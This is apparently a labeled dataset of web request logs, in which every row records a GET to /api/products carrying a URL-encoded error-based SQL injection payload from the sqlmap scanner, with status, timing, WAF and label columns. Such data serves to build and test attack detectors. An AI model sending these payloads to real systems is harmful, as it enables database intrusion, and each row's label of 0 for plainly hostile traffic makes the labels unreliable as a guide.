@timestamp,auth_token_hash,method,path,path_normalized,remote_ip,request_id,response_size,response_time_ms,sampling_flag,status,upstream,user_agent,user_id_hash,user_role,waf_action,waf_rule_id,label
2026-05-05 03:35:33+00:00,(empty),GET,/api/products?q=a%27%29%20AND%206332%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286332%3D6332%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27RoxA%27%20LIKE%20%27RoxA,/api/products,172.20.0.10,debfa4a3fd3f5a8a6fae6be9422fe6c2,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:33+00:00,(empty),GET,/api/products?q=a%25%27%20AND%206332%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286332%3D6332%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27PzlI%25%27%3D%27PzlI,/api/products,172.20.0.10,c102232a2064c9de6f596a25fb589e5a,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:33+00:00,(empty),GET,/api/products?q=a%27%20AND%206332%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286332%3D6332%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27JRYj%27%20LIKE%20%27JRYj,/api/products,172.20.0.10,8d600d9a3e3f8a6cdbc232d1bf21f5ab,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:33+00:00,(empty),GET,/api/products?q=a%22%29%20AND%206332%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286332%3D6332%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%22IQIu%22%3D%22IQIu,/api/products,172.20.0.10,d23b394a17959c00d39e3500f275fd9b,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:33+00:00,(empty),GET,/api/products?q=a%22%20AND%206332%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286332%3D6332%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%22DDrG%22%3D%22DDrG,/api/products,172.20.0.10,f565141048610861215a0c43a250312e,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:33+00:00,(empty),GET,/api/products?q=a%29%20AND%206332%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286332%3D6332%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%288460%3D8460,/api/products,172.20.0.10,c0147211dde45bb043b54ad0e643336b,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:33+00:00,(empty),GET,/api/products?q=a%29%29%20AND%206332%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286332%3D6332%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%287629%3D7629,/api/products,172.20.0.10,e467e88333083c7f4b5ab8768d52eb1c,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:33+00:00,(empty),GET,/api/products?q=a%20AND%206332%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286332%3D6332%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29,/api/products,172.20.0.10,4add2e77767dfe11429a32d069bddbe7,0.0,7.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:33+00:00,(empty),GET,/api/products?q=a%20AND%206332%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286332%3D6332%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20kDmu,/api/products,172.20.0.10,c4a90e2770aa174c027272f4537ae8df,0.0,8.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:33+00:00,(empty),GET,/api/products?q=a%27%29%20AND%208448%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288448%3D8448%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29%20AND%20%28%27otSM%27%3D%27otSM,/api/products,172.20.0.10,32c41e2b65e0e21c57c073cf7d6a5db1,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:33+00:00,(empty),GET,/api/products?q=a%27%29%29%20AND%208448%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288448%3D8448%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29%20AND%20%28%28%27iBYt%27%3D%27iBYt,/api/products,172.20.0.10,bb8ab217bf4d78e7dd513ebbe1c8e76b,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:33+00:00,(empty),GET,/api/products?q=a%27%20AND%208448%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288448%3D8448%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29%20AND%20%27QHfm%27%3D%27QHfm,/api/products,172.20.0.10,90ec7ce301e0375a7b42ad9382435f3e,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:33+00:00,(empty),GET,/api/products?q=a%27%29%20AND%208448%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288448%3D8448%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29%20AND%20%28%27vZfU%27%20LIKE%20%27vZfU,/api/products,172.20.0.10,643fa404cfafefc6e78bc8d5d18e283a,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%25%27%20AND%208448%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288448%3D8448%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29%20AND%20%27kpnW%25%27%3D%27kpnW,/api/products,172.20.0.10,551239f846a895be600c88e9eda9733e,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%27%20AND%208448%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288448%3D8448%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29%20AND%20%27HOcH%27%20LIKE%20%27HOcH,/api/products,172.20.0.10,1ad0970f21be898b0735591b9fdce60d,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%22%29%20AND%208448%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288448%3D8448%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29%20AND%20%28%22AZxN%22%3D%22AZxN,/api/products,172.20.0.10,88d1f0aef7c16bf45079a012764662e1,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%22%20AND%208448%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288448%3D8448%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29%20AND%20%22eHmX%22%3D%22eHmX,/api/products,172.20.0.10,cd67b47fd65a26d26a2953b0dd9ded56,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%29%20AND%208448%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288448%3D8448%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29%20AND%20%287367%3D7367,/api/products,172.20.0.10,bbfdf157291e1b2664a6a8d6d9f7a71e,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%29%29%20AND%208448%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288448%3D8448%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29%20AND%20%28%284125%3D4125,/api/products,172.20.0.10,d1b5333cbe3251692f5e8976582b05ce,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%20AND%208448%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288448%3D8448%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29,/api/products,172.20.0.10,728166fbcd7d92fcc94592b922adfb77,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%20AND%208448%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288448%3D8448%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29--%20LlJR,/api/products,172.20.0.10,cf05dc0d48e3ed048619874480d70c36,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%27%29%20AND%203479%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%283479%3D3479%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29%20AND%20%28%27JGzN%27%3D%27JGzN,/api/products,172.20.0.10,737d5bb834965fa7a110560b7de0f3d6,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%27%29%29%20AND%203479%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%283479%3D3479%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29%20AND%20%28%28%27tYRy%27%3D%27tYRy,/api/products,172.20.0.10,f2aed719285dbfbc1d82ee8544afe56d,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%27%20AND%203479%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%283479%3D3479%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29%20AND%20%27mZIb%27%3D%27mZIb,/api/products,172.20.0.10,a69176ca5893f2f9529e38ddcfe20d32,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%27%29%20AND%203479%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%283479%3D3479%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29%20AND%20%28%27IYKZ%27%20LIKE%20%27IYKZ,/api/products,172.20.0.10,58ef5c1c91d6545a46bb3ce281e73759,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%25%27%20AND%203479%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%283479%3D3479%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29%20AND%20%27Rwnl%25%27%3D%27Rwnl,/api/products,172.20.0.10,ea6ff85498da31af34752a54013fa0ad,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%27%20AND%203479%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%283479%3D3479%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29%20AND%20%27HlhL%27%20LIKE%20%27HlhL,/api/products,172.20.0.10,7d028b3365b7bf08af200dcf2203358f,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%22%29%20AND%203479%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%283479%3D3479%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29%20AND%20%28%22SMRD%22%3D%22SMRD,/api/products,172.20.0.10,90c00f11f04c3035b2b5ad6acb559d4c,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%22%20AND%203479%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%283479%3D3479%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29%20AND%20%22nFIi%22%3D%22nFIi,/api/products,172.20.0.10,d720e6cb42074b9b024e2db3b2c96cb0,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%29%20AND%203479%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%283479%3D3479%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29%20AND%20%288523%3D8523,/api/products,172.20.0.10,7a18b213d85aca26da583ab6ba73da4d,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%29%29%20AND%203479%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%283479%3D3479%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29%20AND%20%28%282507%3D2507,/api/products,172.20.0.10,c88bd6652de0d2f232cf6272059cccfb,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%20AND%203479%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%283479%3D3479%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29,/api/products,172.20.0.10,55b7cb2a5d4b128790c8695b4b8ae608,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%20AND%203479%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%283479%3D3479%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29--%20LPEz,/api/products,172.20.0.10,aa6126deabd2568076b3599f64c02358,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%27%29%20AND%205643%3DCONCAT%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2C%28SELECT%20%28CASE%20WHEN%20%285643%3D5643%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2CCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%20AND%20%28%27vAHr%27%3D%27vAHr,/api/products,172.20.0.10,dc925679330a75b93ce813c5809dd0b5,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%27%29%29%20AND%205643%3DCONCAT%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2C%28SELECT%20%28CASE%20WHEN%20%285643%3D5643%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2CCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%20AND%20%28%28%27iwkL%27%3D%27iwkL,/api/products,172.20.0.10,db8f74710e78fb8e489227b78d65a2c1,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%27%20AND%205643%3DCONCAT%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2C%28SELECT%20%28CASE%20WHEN%20%285643%3D5643%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2CCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%20AND%20%27AFmP%27%3D%27AFmP,/api/products,172.20.0.10,a2d815f07bfa8f6efbdf948a91c4ac9b,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
